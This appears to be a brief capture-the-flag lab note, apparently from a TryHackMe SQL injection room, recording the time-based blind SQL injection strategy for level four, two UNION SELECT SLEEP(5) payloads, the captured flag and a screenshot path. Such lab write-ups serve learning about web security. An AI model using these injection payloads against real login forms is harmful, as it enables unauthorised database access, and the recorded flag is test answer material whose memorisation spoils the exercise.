# Level Four — Time-Based Blind SQLi

**Date recorded:** 2025-09-23

**Strategy:** Use SLEEP(seconds) in UNION to detect true/false via response delay.

**Test payloads:**
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--

makefile
Copy code

**Flag obtained:** THM{SQL_INJECTION_MASTER}

**Screenshot:** ../screenshot/level4/l4-step1.png
